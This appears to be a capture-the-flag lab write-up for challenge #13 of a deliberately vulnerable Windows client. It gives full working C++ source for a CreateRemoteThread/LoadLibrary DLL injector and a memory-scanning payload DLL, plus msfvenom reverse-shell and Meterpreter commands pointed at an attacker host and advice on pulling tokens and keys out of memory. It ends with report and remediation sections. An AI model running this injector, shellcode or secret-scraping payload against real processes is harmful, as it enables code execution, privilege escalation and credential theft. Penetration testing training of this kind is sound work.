# #13 — CreateRemoteThread + LoadLibrary injection

**Category:** Process injection · **Tier:** MEDIUM · **Points:** 100 · **CWE:** CWE-114

## Objective

Inject a DLL into the running `MVTC.exe` using the classic Win32 chain:
`OpenProcess` → `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread(LoadLibraryA)`.
The payload DLL reads the `#13` sentinel from managed memory and writes it out.

The sentinel is `InjectionSentinels._crt` — a managed string prefixed `MVTC{v13_crt_...}`, pinned at startup, lives on the GC heap for the lifetime of the process.

## Prerequisites

- Visual Studio 2022 (or standalone Build Tools) with MSVC v143
- Developer PowerShell (so `cl.exe` and `link.exe` are on PATH)
- Process Hacker, Process Explorer, or `tasklist /fi "imagename eq MVTC.exe"` to find the PID
- Must run elevated as a user with `SeDebugPrivilege` (any local admin by default)

---

## Full payload DLL (`mvtc_payload_13.dll`)

Save as `payload_13.cpp`:

```cpp
// payload_13.cpp — writes the #13 sentinel to C:\Users\Public\v13.txt
#include <windows.h>
#include <psapi.h>
#include <cstdio>
#include <cstring>
#pragma comment(lib, "psapi.lib")

static const char PREFIX[] = "MVTC{v13_crt_";
static const size_t PREFIX_LEN = sizeof(PREFIX) - 1;

static bool WriteFound(const char* out, size_t len) {
    HANDLE f = CreateFileA("C:\\Users\\Public\\v13.txt",
        GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD w = 0; WriteFile(f, out, (DWORD)len, &w, nullptr);
    CloseHandle(f);
    return true;
}

static void HeapScan() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;

    MEMORY_BASIC_INFORMATION mbi;
    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE)) != 0 &&
            (mbi.Protect & PAGE_GUARD) == 0)
        {
            __try {
                unsigned char* p   = (unsigned char*)mbi.BaseAddress;
                unsigned char* top = p + mbi.RegionSize - PREFIX_LEN;
                for (; p < top; ++p) {
                    if (p[0] == 'M' && memcmp(p, PREFIX, PREFIX_LEN) == 0) {
                        // Find the terminating '}'
                        unsigned char* e = p;
                        while (e < top + PREFIX_LEN + 128 && *e != '}') ++e;
                        if (e < top + PREFIX_LEN + 128) {
                            size_t len = (size_t)(e - p) + 1;
                            WriteFound((const char*)p, len);
                            return;
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) { /* skip */ }
        }
        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        // Spawn worker so DllMain returns quickly
        CreateThread(nullptr, 0, [](LPVOID) -> DWORD { HeapScan(); return 0; },
                     nullptr, 0, nullptr);
    }
    return TRUE;
}
```

Build:

```powershell
cl /LD /EHsc /O2 /nologo payload_13.cpp /Fe:mvtc_payload_13.dll
```

Produces `mvtc_payload_13.dll` in the current folder.

---

## Full injector (`inject_13.exe`)

Save as `inject_13.cpp`:

```cpp
// inject_13.cpp — CreateRemoteThread + LoadLibrary chain
#include <windows.h>
#include <stdio.h>
#include <string.h>

static bool EnableDebugPrivilege() {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok)) return false;

    LUID luid;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid)) {
        CloseHandle(tok); return false;
    }
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    CloseHandle(tok);
    return ok;
}

int wmain(int argc, wchar_t** argv) {
    if (argc != 3) {
        wprintf(L"usage: inject_13.exe <mvtc_pid> <absolute-path-to-dll>\n");
        return 1;
    }
    DWORD pid = (DWORD)_wtoi(argv[1]);
    const wchar_t* dllW = argv[2];

    // Convert dll path to ANSI (LoadLibraryA takes const char*)
    char dllA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, dllW, -1, dllA, sizeof(dllA), nullptr, nullptr);

    EnableDebugPrivilege();

    HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!p) { wprintf(L"OpenProcess failed: %lu\n", GetLastError()); return 2; }

    size_t len = strlen(dllA) + 1;
    LPVOID remote = VirtualAllocEx(p, nullptr, len, MEM_COMMIT, PAGE_READWRITE);
    if (!remote) { wprintf(L"VirtualAllocEx failed: %lu\n", GetLastError()); return 3; }

    SIZE_T wrote = 0;
    if (!WriteProcessMemory(p, remote, dllA, len, &wrote) || wrote != len) {
        wprintf(L"WriteProcessMemory failed: %lu\n", GetLastError()); return 4;
    }

    HMODULE k = GetModuleHandleW(L"kernel32.dll");
    FARPROC ll = GetProcAddress(k, "LoadLibraryA");
    HANDLE th = CreateRemoteThread(p, nullptr, 0,
                                   (LPTHREAD_START_ROUTINE)ll, remote, 0, nullptr);
    if (!th) { wprintf(L"CreateRemoteThread failed: %lu\n", GetLastError()); return 5; }

    WaitForSingleObject(th, 5000);
    DWORD exitCode = 0;
    GetExitCodeThread(th, &exitCode);
    wprintf(L"remote thread returned 0x%lx (HMODULE of %hs)\n", exitCode, dllA);

    CloseHandle(th);
    VirtualFreeEx(p, remote, 0, MEM_RELEASE);
    CloseHandle(p);
    return 0;
}
```

Build:

```powershell
cl /EHsc /O2 /nologo inject_13.cpp /Fe:inject_13.exe
```

---

## Run

```powershell
# 1. Launch the vulnerable app and log in
#    (so the sentinel is initialized from progress.db)

# 2. Find the PID
Get-Process MVTC | Select-Object Id, ProcessName

# 3. Fire the injector (adjust path + PID)
.\inject_13.exe 12345 "C:\path\to\mvtc_payload_13.dll"

# 4. Read the sentinel
type C:\Users\Public\v13.txt
```

Expected output on step 4:

```
MVTC{v13_crt_<16-byte base32 per install>}
```

Submit that string to the in-app Flag console → `+100 pts`.

---

## Common failure modes

| Symptom | Fix |
|---|---|
| `OpenProcess failed: 5` (access denied) | Run elevated. If still denied, enable `SeDebugPrivilege` (code above does it) |
| `remote thread returned 0x0` | `LoadLibraryA` returned null → DLL path wrong or missing dependency. Use `dumpbin /dependents` on your DLL. The DLL must be x64 (match MVTC.exe's architecture) |
| `v13.txt` not written | Payload DLL's `DllMain` runs but scan fails. Make sure the app logged in (sentinel only initializes after `AuthService.FlagLookup` fires). Add `OutputDebugString` in the DLL and watch with DbgView |
| Payload scans forever | GC moved the string. Retry after waiting a few seconds, or call `GC.Collect()` from a .NET side-channel (not needed in practice — the string is pinned by `InjectionSentinels` static field) |

---

---

## Concept — what this attack actually is

Every Windows process has a loader list, a handle table, and threads created by `kernel32`. The `CreateRemoteThread` API lets you ask the kernel to create a new thread **inside another process** and run a function at a specified address. If you point that function at `LoadLibraryA` and supply a DLL path as the argument, the kernel does the "load this DLL" dance **inside the target**: your DLL's `DllMain(DLL_PROCESS_ATTACH)` runs with the target's identity, token, environment variables, and open handles.

**Why this is dangerous:** the attacker gets code running inside a process they could not legitimately launch — the target's secrets (in-process keys, decrypted blobs, session tokens, cached credentials) become directly readable, and any functionality the app exposes (named pipes, COM servers, UI automation) is now operable with the attacker's logic. On a thick-client pentest this is often the pivot from "I can run programs on the box" to "I own this product's trust boundary".

**Preconditions:** the attacker needs `PROCESS_CREATE_THREAD`, `PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE` on the target. A local admin gets these by default (plus `SeDebugPrivilege`). A user-level attacker gets them against processes owned by the same user token.

---

## Discovery — how to spot this in a real target

Signs the target is vulnerable:

1. `winchecksec target.exe` → **DEP/ASLR/CFG/CET missing** — if any are off, injection is cheaper
2. `Get-AuthenticodeSignature .\MVTC.exe` → **NotSigned** or **UnknownError** → no signature means no `/INTEGRITYCHECK` in the PE either
3. The process **is not a Protected Process Light** → `Get-Process target | Format-List ProtectedProcess` returns `False` or absent
4. **No EDR hooks** on `NtCreateThreadEx` → test with a known injection in a lab (Procmon won't show it; ETW `Microsoft-Windows-Threat-Intelligence` would)
5. The app has **long-lived in-memory secrets** (session tokens stored in static singletons, config decrypted once at startup, API keys left in managed strings)
6. The process is **running under a privileged account** (service running as SYSTEM is the jackpot — injection → SYSTEM shell)

Where to look during a thick-client assessment:
- Open `Process Hacker` → **Permissions** tab on the target → anyone with `PROCESS_ALL_ACCESS` can inject
- Static review: grep the binary strings for `SecureString`, `DPAPI`, `ProtectedMemory`. Absence suggests secrets are in cleartext managed memory
- Watch Procmon for `LoadImage` events on DLLs from writable paths — those paths are also inject-friendly

---

## Impact demonstrations

The payload DLL from the "Exploitation" section pulled a sentinel — fine for the lab challenge. For a pentest report you want to demonstrate **arbitrary code execution** convincingly.

### 1. Pop calc.exe (simplest "it executes" PoC)

Change your payload DLL's `DllMain` to:

```cpp
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        WinExec("calc.exe", SW_SHOW);
    }
    return TRUE;
}
```

Rebuild `cl /LD /EHsc payload_13_calc.cpp /Fe:payload_13_calc.dll`, run the injector, and `calc.exe` opens as a **child of MVTC.exe**. Verify in Process Hacker → Properties → Parent PID. Screenshot it for the report.

### 2. Reverse shell (realistic impact)

On your Kali / testing box, generate shellcode:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f c -b '\x00\x0a\x0d' --encrypt xor
```

Paste the `unsigned char buf[]` into a new payload:

```cpp
// payload_13_revshell.cpp
#include <windows.h>
unsigned char buf[] = { 0xfc, 0x48, 0x83, 0xe4, /* …msfvenom output… */ };

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        void* mem = VirtualAlloc(nullptr, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(mem, buf, sizeof(buf));
        CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    }
    return TRUE;
}
```

Build, start the listener, fire the injector:

```bash
# Kali
nc -lvnp 4444

# Victim
.\inject_13.exe <mvtc_pid> C:\path\to\payload_13_revshell.dll
```

Shell lands as **the user running MVTC**, inside MVTC's working directory. If MVTC is launched by `MVTCVaultSvc` under SYSTEM, you get **NT AUTHORITY\SYSTEM**.

For Meterpreter instead:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.5 LPORT=4444 \
  -f dll -o meter.dll

msfconsole -q -x "use exploit/multi/handler; \
                  set PAYLOAD windows/x64/meterpreter/reverse_tcp; \
                  set LHOST 10.0.0.5; set LPORT 4444; \
                  set ExitOnSession false; exploit -j"

# then on victim:
.\inject_13.exe <mvtc_pid> C:\path\to\meter.dll
```

### 3. In-memory secret theft (shows business impact)

Add this to your DLL to prove you can steal session tokens:

```cpp
// Dumps all MVTC{...} prefixed strings in the process to a file
// (the full lab challenge payload above does exactly this)
// Then add any domain-specific sensitive strings you spot during discovery:
//   - "Bearer "       (OAuth tokens in HTTP headers)
//   - "pk_live_"      (API keys)
//   - "-----BEGIN "   (PEM-encoded private keys)
//   - "SELECT * FROM" (cached SQL)
```

Document which secrets were recoverable — this maps directly to the "business impact" paragraph in your report.

---

## Report writeup template

**Finding title:** Process injection via `CreateRemoteThread` + `LoadLibrary` into unsigned client

**Severity:** High (CVSS 7.8 — AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L)

**CWE:** CWE-114 (Process Control)

**Affected component:** `MVTC.exe` and all modules it loads (notably `MVTC.Core.dll` which holds session tokens and planted flags)

**Description:** The MVTC client does not enable Protected Process Light, Arbitrary Code Guard, nor any image-load signature policy. Any local user able to open the MVTC process (default for the owning user; any admin via `SeDebugPrivilege`) can call `CreateRemoteThread` with `LoadLibraryA` and run arbitrary native code inside the MVTC process. Because the client keeps long-lived secrets (session tokens, decryption keys, planted sentinel strings) in managed string statics, the injected code can read them directly.

**Reproduction steps:**
1. Compile `payload_13.cpp` and `inject_13.cpp` from the attached source (`appendix_a_injection/`)
2. Launch and log in to MVTC
3. Run `inject_13.exe <mvtc_pid> C:\path\to\payload.dll`
4. Payload runs inside MVTC. In the PoC it writes a secret to `C:\Users\Public\v13.txt`; in the full exploit it opens a reverse shell to the attacker (`screenshot_02.png`)

**Impact demonstrated:**
- Arbitrary code execution as the MVTC process identity
- Theft of in-process secrets (session token, encryption key, user credentials)
- Full access to any resources MVTC can access (named pipes, local databases, backend HTTP endpoints via its authenticated session)
- When `MVTCVaultSvc` is running as SYSTEM: local privilege escalation to SYSTEM via chained exploitation of #37 (insecure IPC)

**Remediation:** See the "Secure code fix" section below. Prioritise:
1. Enable `ProhibitDynamicCode` + `MicrosoftSignedOnly` mitigations
2. Authenticode-sign all binaries
3. Move secrets to `SecureString` / DPAPI
4. Deploy an EDR with ETW Threat-Intelligence consumer rules on `CreateRemoteThread` to unsigned modules

---

## Secure code fix

A thick client cannot block `CreateRemoteThread` from a local administrator, but you can raise the bar significantly:

- **Enable Protected Process Light** at startup if the process qualifies (`SetProcessMitigationPolicy` with a signer policy)
- Call `SetProcessMitigationPolicy` with:
  - `ProcessDynamicCodePolicy.ProhibitDynamicCode = true` (blocks `VirtualAllocEx` for executable pages)
  - `ProcessImageLoadPolicy.NoRemoteImages = true` (blocks loading images from remote mounts)
  - `ProcessImageLoadPolicy.NoLowMandatoryLabelImages = true`
- Register an ETW consumer (`Microsoft-Windows-Threat-Intelligence`) or run under an EDR that alerts on `CreateRemoteThread` to non-system modules
- Never keep raw secrets or injection sentinels in long-lived managed strings — see **#27** fix (`SecureString` + `GCHandle`-pinned byte arrays zeroed after use)
